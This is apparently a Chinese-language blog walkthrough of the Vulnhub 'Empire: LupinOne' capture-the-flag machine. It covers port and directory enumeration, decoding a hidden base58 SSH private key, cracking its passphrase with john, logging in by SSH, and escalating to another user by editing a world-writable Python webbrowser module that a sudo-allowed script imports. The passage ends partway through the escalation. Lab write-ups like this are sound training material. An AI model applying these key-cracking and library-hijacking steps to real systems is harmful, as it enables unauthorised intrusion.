---
title: Vulnhub-Empire LupinOne
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Empire: LupinOne

> https://www.vulnhub.com/entry/empire-lupinone,750/
> 

描述：CTF like box. You have to enumerate as much as you can. 需要很多枚举

## 端口扫描主机发现

1. 探测存活主机，`182`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24                   
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 10:04 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00016s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00011s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.182
    Host is up (0.00019s latency).
    MAC Address: 00:0C:29:15:7C:F5 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00033s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口，仅存在`80`端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.182
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 10:05 CST
    Nmap scan report for 192.168.75.182
    Host is up (0.0010s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:15:7C:F5 (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22 192.168.75.182    
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 10:07 CST
    Nmap scan report for 192.168.75.182
    Host is up (0.0012s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.48 ((Debian))
    MAC Address: 00:0C:29:15:7C:F5 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.182 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 10:08 CST
    Nmap scan report for 192.168.75.182
    Host is up (0.0050s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /robots.txt: Robots file
    |   /image/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
    |_  /manual/: Potentially interesting folder
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    MAC Address: 00:0C:29:15:7C:F5 (VMware)
    ```
    

## web渗透

1. 访问主页，就一张照片
    
    ![image.png](image%2062.png)
    
2. 因为说需要多的枚举，我们尝试使用`binwalk`分离照片，但是没有分离出来
3. 扫描目录
    
    ```python
    dirsearch -u 192.168.75.182 -x 403,404
    //
    [10:18:10] Starting:                                                                                                                                         
    [10:18:41] 301 -  316B  - /image  ->  http://192.168.75.182/image/          
    [10:18:42] 301 -  321B  - /javascript  ->  http://192.168.75.182/javascript/
    [10:18:46] 301 -  317B  - /manual  ->  http://192.168.75.182/manual/        
    [10:18:46] 200 -  208B  - /manual/index.html                                
    [10:18:57] 200 -   34B  - /robots.txt      
    ```
    
    - `robots.txt` ，给了新路径
        
        ```python
        User-agent: *
        Disallow: /~myfiles
        ```
        
        访问 `/~myfiles`
        
        ```python
        Error 404
         Your can do it, keep trying. 
        ```
        
        可能会存在什么，因为~在旧的`apache`中是表示用户目录
        
    - `/manual` 跳转到`apache`服务器文档，进入时时选择语言，默认重定向到`en`
4. 通过`robots.txt`给的提示，混淆一下是否存在别的目录
    
    ```python
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hh 276 http://192.168.75.182/~FUZZ/
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    Target: http://192.168.75.182/~FUZZ/
    Total requests: 3024
    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                                     
    =====================================================================
    000002402:   200        5 L      54 W       331 Ch      "secret"                                                                                    
    Total time: 0
    Processed Requests: 3024
    Filtered Requests: 3023
    Requests/sec.: 0
    ```
    
    发现新的`~secret` 目录，访问
    
    ```python
    # http://192.168.75.182/~secret/
    Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,
    Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
    I'm smart I know that.
    Any problem let me know
    Your best friend icex64 
    ```
    
    说在当前目录下隐藏了`ssh`的私钥文件，并且可以使用`fasttrack`字典来破解，并且知道用户是`icex64`
    
5. 再使用`wfuzz`混淆，文件名前加`.` 表示文件是隐藏的
    
    ```python
    **wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 276 http://192.168.75.182/~secret/.FUZZ.txt** 
    ```
    
    发现文件 `/~secret/.mysecret.txt` ，访问是一片貌似`base64`的文字
    
    ```python
    cGxD6KNZQddY6iCsSuqPzUdqSx4F5ohDYnArU3kw5dmvTURqcaTrncHC3NLKBqFM2ywrNbRTW3eTpUvEz9qFuBnyhAK8TWu9cFxLoscWUrc4rLcRafiVvxPRpP692Bw5bshu6ZZpixzJWvNZhPEoQoJRx7jUnupsEhcCgjuXD7BN1TMZGL2nUxcDQwahUC1u6NLSK81Yh9LkND67WD87Ud2JpdUwjMossSeHEbvYjCEYBnKRPpDhSgL7jmTzxmtZxS9wX6DNLmQBsNT936L6VwYdEPKuLeY6wuyYmffQYZEVXhDtK6pokmA3Jo2Q83cVok6x74M5DA1TdjKvEsVGLvRMkkDpshztiGCaDu4uceLw3iLYvNVZK75k9zK9E2qcdwP7yWugahCn5HyoaooLeBDiCAojj4JUxafQUcmfocvugzn81GAJ8LdxQjosS1tHmriYtwp8pGf4Nfq5FjqmGAdvA2ZPMUAVWVHgkeSVEnooKT8sxGUfZxgnHAfER49nZnz1YgcFkR73rWfP5NwEpsCgeCWYSYh3XeF3dUqBBpf6xMJnS7wmZa9oWZVd8Rxs1zrXawVKSLxardUEfRLh6usnUmMMAnSmTyuvMTnjK2vzTBbd5djvhJKaY2szXFetZdWBsRFhUwReUk7DkhmCPb2mQNoTSuRpnfUG8CWaD3L2Q9UHepvrs67YGZJWwk54rmT6v1pHHLDR8gBC9ZTfdDtzBaZo8sesPQVbuKA9VEVsgw1xVvRyRZz8JH6DEzqrEneoibQUdJxLVNTMXpYXGi68RA4V1pa5yaj2UQ6xRpF6otrWTerjwALN67preSWWH4vY3MBv9Cu6358KWeVC1YZAXvBRwoZPXtquY9EiFL6i3KXFe3Y7W4Li7jF8vFrK6woYGy8soJJYEbXQp2NWqaJNcCQX8umkiGfNFNiRoTfQmz29wBZFJPtPJ98UkQwKJfSW9XKvDJwduMRWey2j61yaH4ij5uZQXDs37FNV7TBj71GGFGEh8vSKP2gg5nLcACbkzF4zjqdikP3TFNWGnij5az3AxveN3EUFnuDtfB4ADRt57UokLMDi1V73Pt5PQe8g8SLjuvtNYpo8AqyC3zTMSmP8dFQgoborCXEMJz6npX6QhgXqpbhS58yVRhpW21Nz4xFkDL8QFCVH2beL1PZxEghmdVdY9N3pVrMBUS7MznYasCruXqWVE55RPuSPrMEcRLoCa1XbYtG5JxqfbEg2aw8BdMirLLWhuxbm3hxrr9ZizxDDyu3i1PLkpHgQw3zH4GTK2mb5fxuu9W6nGWW24wjGbxHW6aTneLweh74jFWKzfSLgEVyc7RyAS7Qkwkud9ozyBxxsV4VEdf8mW5g3nTDyKE69P34SkpQgDVNKJvDfJvZbL8o6BfPjEPi125edV9JbCyNRFKKpTxpq7QSruk7L5LEXG8H4rsLyv6djUT9nJGWQKRPi3Bugawd7ixMUYoRMhagBmGYNafi4JBapacTMwG95wPyZT8Mz6gALq5Vmr8tkk9ry4Ph4U2ErihvNiFQVS7U9XBwQHc6fhrDHz2objdeDGvuVHzPgqMeRMZtjzaLBZ2wDLeJUKEjaJAHnFLxs1xWXU7V4gigRAtiMFB5bjFTc7owzKHcqP8nJrXou8VJqFQDMD3PJcLjdErZGUS7oauaa3xhyx8Ar3AyggnywjjwZ8uoWQbmx8Sx71x4NyhHZUzHpi8vkEkbKKk1rVLNBWHHi75HixzAtNTX6pnEJC3t7EPkbouDC2eQd9i6K3CnpZHY3mL7zcg2PHesRSj6e7oZBoM2pSVTwtXRFBPTyFmUavtitoA8kFZb4DhYMcxNyLf7r8H98WbtCshaEBaY7b5CntvgFFEucFanfbz6w8cDyXJnkzeW1fz19Ni9i6h4Bgo6BR8Fkd5dheH5TGz47VFH6hmY3aUgUvP8Ai2F2jKFKg4i3HfCJHGg1CXktuqznVucjWmdZmuACA2gce2rpiBT6GxmMrfSxDCiY32axw2QP7nzEBvCJi58rVe8JtdESt2zHGsUga2iySmusfpWqjYm8kfmqTbY4qAK13vNMR95QhXV9VYp9qffG5YWY163WJV5urYKM6BBiuK9QkswCzgPtjsfFBBUo6vftNqCNbzQn4NMQmxm28hDMDU8GydwUm19ojNo1scUMzGfN4rLx7bs3S9wYaVLDLiNeZdLLU1DaKQhZ5cFZ7iymJHXuZFFgpbYZYFigLa7SokXis1LYfbHeXMvcfeuApmAaGQk6xmajEbpcbn1H5QQiQpYMX3BRp41w9RVRuLGZ1yLKxP37ogcppStCvDMGfiuVMU5SRJMajLXJBznzRSqBYwWmf4MS6B57xp56jVk6maGCsgjbuAhLyCwfGn1LwLoJDQ1kjLmnVrk7FkUUESqJKjp5cuX1EUpFjsfU1HaibABz3fcYY2cZ78qx2iaqS7ePo5Bkwv5XmtcLELXbQZKcHcwxkbC5PnEP6EUZRb3nqm5hMDUUt912ha5kMR6g4aVG8bXFU6an5PikaedHBRVRCygkpQjm8Lhe1cA8X2jtQiUjwveF5bUNPmvPGk1hjuP56aWEgnyXzZkKVPbWj7MQQ3kAfqZ8hkKD1VgQ8pmqayiajhFHorfgtRk8ZpuEPpHH25aoJfNMtY45mJYjHMVSVnvG9e3PHrGwrks1eLQRXjjRmGtWu9cwT2bjy2huWY5b7xUSAXZfmRsbkT3eFQnGkAHmjMZ5nAfmeGhshCtNjAU4idu8o7HMmMuc3tpK6res9HTCo35ujK3UK2LyMFEKjBNcXbigDWSM34mXSKHA1M4MF7dPewvQsAkvxRTCmeWwRWz6DKZv2MY1ezWd7mLvwGo9ti9SMTXrkrxHQ8DShuNorjCzNCuxLNG9ThpPgWJoFb1sJL1ic9QVTvDHCJnD1AKdCjtNHrG973BVZNUF6DwbFq5d4CTLN6jxtCFs3XmoKquzEY7MiCzRaq3kBNAFYNCoVxRBU3d3aXfLX4rZXEDBfAgtumkRRmWowkNjs2JDZmzS4H8nawmMa1PYmrr7aNDPEW2wdbjZurKAZhheoEYCvP9dfqdbL9gPrWfNBJyVBXRD8EZwFZNKb1eWPh1sYzUbPPhgruxWANCH52gQpfATNqmtTJZFjsfpiXLQjdBxdzfz7pWvK8jivhnQaiajW3pwt4cZxwMfcrrJke14vN8Xbyqdr9zLFjZDJ7nLdmuXTwxPwD8Seoq2hYEhR97DnKfMY2LhoWGaHoFqycPCaX5FCPNf9CFt4n4nYGLau7ci5uC7ZmssiT1jHTjKy7J9a4q614GFDdZULTkw8Pmh92fuTdK7Z6fweY4hZyGdUXGtPXveXwGWES36ecCpYXPSPw6ptVb9RxC81AZFPGnts85PYS6aD2eUmge6KGzFopMjYLma85X55Pu4tCxyF2FR9E3c2zxtryG6N2oVTnyZt23YrEhEe9kcCX59RdhrDr71Z3zgQkAs8uPMM1JPvMNgdyNzpgEGGgj9czgBaN5PWrpPBWftg9fte4xYyvJ1BFN5WDvTYfhUtcn1oRTDow67w5zz3adjLDnXLQc6MaowZJ2zyh4PAc1vpstCRtKQt35JEdwfwUe4wzNr3sidChW8VuMU1Lz1cAjvcVHEp1Sabo8FprJwJgRs5ZPA7Ve6LDW7hFangK8YwZmRCmXxArBFVwjfV2SjyhTjhdqswJE5nP6pVnshbV8ZqG2L8d1cwhxpxggmu1jByELxVHF1C9T3GgLDvgUv8nc7PEJYoXpCoyCs55r35h9YzfKgjcJkvFTdfPHwW8fSjCVBuUTKSEAvkRr6iLj6H4LEjBg256G4DHHqpwTgYFtejc8nLX77LUoVmACLvfC439jtVdxCtYA6y2vj7ZDeX7zp2VYR89GmSqEWj3doqdahv1DktvtQcRBiizMgNWYsjMWRM4BPScnn92ncLD1Bw5ioB8NyZ9CNkMNk4Pf7Uqa7vCTgw4VJvvSjE6PRFnqDSrg4avGUqeMUmngc5mN6WEa3pxHpkhG8ZngCqKvVhegBAVi7nDBTwukqEDeCS46UczhXMFbAgnQWhExas547vCXho71gcmVqu2x5EAPFgJqyvMmRScQxiKrYoK3p279KLAySM4vNcRxrRrR2DYQwhe8YjNsf8MzqjX54mhbWcjz3jeXokonVk77P9g9y69DVzJeYUvfXVCjPWi7aDDA7HdQd2UpCghEGtWSfEJtDgPxurPq8qJQh3N75YF8KeQzJs77Tpwcdv2Wuvi1L5ZZtppbWymsgZckWnkg5NB9Pp5izVXCiFhobqF2vd2jhg4rcpLZnGdmmEotL7CfRdVwUWpVppHRZzq7FEQQFxkRL7JzGoL8R8wQG1UyBNKPBbVnc7jGyJqFujvCLt6yMUEYXKQTipmEhx4rXJZK3aKdbucKhGqMYMHnVbtpLrQUaPZHsiNGUcEd64KW5kZ7svohTC5i4L4TuEzRZEyWy6v2GGiEp4Mf2oEHMUwqtoNXbsGp8sbJbZATFLXVbP3PgBw8rgAakz7QBFAGryQ3tnxytWNuHWkPohMMKUiDFeRyLi8HGUdocwZFzdkbffvo8HaewPYFNsPDCn1PwgS8wA9agCX5kZbKWBmU2zpCstqFAxXeQd8LiwZzPdsbF2YZEKzNYtckW5RrFa5zDgKm2gSRN8gHz3WqS
    ```
    
6. 使用`base64`解码，但是解开是乱码，再尝试`base58`
    
    ```python
    curl http://192.168.75.182/~secret/.mysecret.txt | base58 --decode
    //
    -----BEGIN OPENSSH PRIVATE KEY-----
    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
    iUJ66WmRUN9EoVlkeCzQJwivI=
    -----END OPENSSH PRIVATE KEY-----  
    ```
    
    是一个私钥文件，将它存为`prikey`
    
7. 根据上面的提示还可以知道可以用`fasttrack`来破解密码
    - 将SSH 私钥转换为 John the Ripper 可用的哈希格式，从而用 `john` 来进行暴力破解
        
        ```python
        python /usr/share/john/ssh2john.py prikey > key
        ```
        
    - 使用`fasttrack`字典爆破，破解出密码`P@55w0rd!`
        
        ```python
        john --wordlist=/usr/share/wordlists/fasttrack.txt key                         
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
        Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
        Cost 2 (iteration count) is 16 for all loaded hashes
        Will run 8 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        P@55w0rd!        (prikey)     
        1g 0:00:00:04 DONE (2024-11-05 11:40) 0.2100g/s 26.89p/s 26.89c/s 26.89C/s Autumn2013..change
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed. 
        ```
        
8. 使用`ssh`指定私钥进行登录，密码使用刚刚破解出来的`P@55w0rd!` ,用户是`icex64`
    
    ```python
    ssh -i prikey icex64@192.168.75.182
    ```
    
    ```python
    Enter passphrase for key 'prikey': 
    Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
    ########################################
    Welcome to Empire: Lupin One
    ########################################
    Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
    icex64@LupinOne:~$ 
    ```
    
    获得`shell`
    

## 提权

1. 查看权限
    
    ```python
    icex64@LupinOne:~$ whoami
    icex64
    icex64@LupinOne:~$ id
    uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
    icex64@LupinOne:~$ uname -a
    Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux
    ```
    
2. 寻找利用点
    - `sudo -l` ，存在一个允许`arsene`的权限执行`py`脚本
        
        ```python
        icex64@LupinOne:~$ sudo -l
        Matching Defaults entries for icex64 on LupinOne:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
        
        User icex64 may run the following commands on LupinOne:
            (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
        ```
        
    - 当前目录下存在`user.txt`文件
        
        ```python
            ...,    ,...    ..,.   .,,  *&@@@@@@@@@@&/.    ,,,.   .,..    ...,    ...,  
            ,,,.    .,,,    *&@@%%%%%%%%%%%%%%%%%%%%%%%%%%%&@,.   ..,,    ,,,,    ,,,.  
        ..,.    ,..,  (@&#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%,.    ..,,    ,...    ..
            .... .@&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  ....    ....    ,...  
            .,#@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  .,..    ,.,.    ...,  
        .,,,&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@#@.,    .,.,    .,..    .,
        ...@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@####@*.    ..,,    ....    ,.
           @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%#######@% .,.,    .,.,    .,.,  
        ..,,@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%#######@@,    ..,.    ,..,    ..
        .,,, @@@@@@@@&%%%%%%%%%%%%%&@@@@@@@@@@@@@@@@@@@%%%#####@@,    .,,,    ,,.,    .,
            ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%###@@ .,..    ...,    ....  
        ...,  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#&@.    ...,    ...,    ..
        ....   #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@.    ....    ....    ..
            .,.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%#@*.,.,    .,.,    ..@@@@
        ..,.    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#@@    ..,.    ,..*@&&@@.
        .,,.    ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%@@    .,,.    .@&&&@( ,,
            ,.,.  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%@@%%&@@@, ,,,@&@@@.,,,  
        ....    ...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&%%%%&%,@%%%%%%%#@@@@@%..    ..
        ...,    ...,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@,*,,@%%%%%%@@@&@%%@..    ..
            ,,.,    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,***,*,@%%%@@&@@@%%###@ ,,.,  
            .,. @@&&&@@,,/@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,,,,*,,@%%%@&&@@%%%%%##&* ,...  
        .,,, @@&@@&@&@@%,*,*,*,*,***,*,*,***,*,*,*,*,*,*,**,&@%%&@@@&@%%%%%%%%@/.,    .,
          /@@&&&&&&&&&&@@*,,,,,,,,,,,,,,,,,,,,,,*,,,**,%@&%%%%@&&&@%%%%%%%%%@(    ,..,  
         @&@&@&@&@&@&@&&@@@@@(,*,*,,**,*,*,,,*#&@@&%%%%%%%%&@@@@@%%%%%%%%@&..,    .,.,  
        @@@&&&&&&&&&&&&&&&&&@@@&&&@@@@&&@@&&@&&&%&%%%%%%%@&&&@&%%%%%%&@,..    ...,    ..
         @&&&@&@&@&@&@&@&@&@&@&@&@&@&&@@@&&&&&&&%&%%%%&@&&@@%%%#&@%..,    .,.,    .,.,  
          @@@@&&&&&&&&&&&&&&&&&&&&&&@&&&&&&&&&&&%%&%@&@&@&@@%..   ....    ....    ,..,  
        .,,, *@@&&&@&@&@&@&@&@&&&&&&&&&&&&&&&&&%&&@@&&@....    ,.,    .,,,    ,,..    .,
            ,,,,    .,%@@@@@@@@@@@@@@@@%,  ...,@@&&@(,,    ,,,.   .,,,    ,,.,    .,,.  
            .,.,    .,,,    .,,.   ..,.    ,*@@&&@ ,,,,    ,.,.   .,.,    .,.,    .,.,  
        ...,    ....    ....    ,..    ,..@@@&@#,..    ....    ,..    ...,    ....    ..
            ....    ....    ...    ....@.,%&@..    ....    ...    ....    ....    ....  
            ...,    ....    ....   .*/,...&.,,,    ....    ....   .,..    ...,    ...,  
        .,.,    .,.,    ,,.,    .,../*,,&,,    ,.,,    ,.,,    ..,    .,.,    .,.,    ,,
        
        3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
        ```
        
    - `/home/arsene` 下存在 `note.txt`
        
        ```python
        Hi my friend Icex64,
        
        Can you please help check if my code is secure to run, I need to use for my next heist.
        
        I dont want to anyone else get inside it, because it can compromise my account and find my secret file.
        
        Only you have access to my program, because I know that your account is secure.
        
        See you on the other side.
        
        Arsene Lupin.
        
        ```
        
        提到`arsene` 下存在秘密文件，并且它的代码就是我们可以`sudo`运行的
        
3. 查看`heist.py`文件
    
    ```python
    import webbrowser
    
    print ("Its not yet ready to get in action")
    
    webbrowser.open("https://empirecybersecurity.co.mz")
    ```
    
    操作逻辑就是打开使用`print`函数输出一句话然后使用`webbrowser.open` 函数打开网址
    
    查看文件权限
    
    ```python
    icex64@LupinOne:/home/arsene$ ls -al | grep heist.py 
    -rw-r--r-- 1 arsene arsene  118 Oct  4  2021 heist.py
    ```
    
    很可惜，知识只读的
    
4. 我们把注意力放在`webbrowser` 这个库中（`heist.py`中引入的库），因为文件里面调用了`webbrowser.open`函数
    - 搜索`webbrowser` 文件，应该就是第一个
        
        ```python
        icex64@LupinOne:/usr/share/python3$ find / -name *webbrowser* 2>/dev/null
        /usr/lib/python3.9/webbrowser.py
        /usr/lib/python3.9/**pycache**/webbrowser.cpython-39.pyc
        ```
        
    - 查看其权限，竟然是可编辑的，那就可以得到`arsene` 用户的`shell`了
        
        ```python
        icex64@LupinOne:/usr/lib/python3.9$ ls -al | grep web
        -rwxrwxrwx  1 root root  24087 Oct  4  2021 webbrowser.py
        ```
        
    - 添加代码，直接调用`system` 函数
        
        ![image.png](image%2063.png)
        
5. 保存退出，执行就能获得`arsene` 的`shell`了
    
    ```python
    sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
    ```
    
    ![image.png](image%2064.png)
    
6. 查看`arsene` 的权限
    
    ```python
    arsene@LupinOne:/usr/lib/python3.9$ sudo -l
    Matching Defaults entries for arsene on LupinOne:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
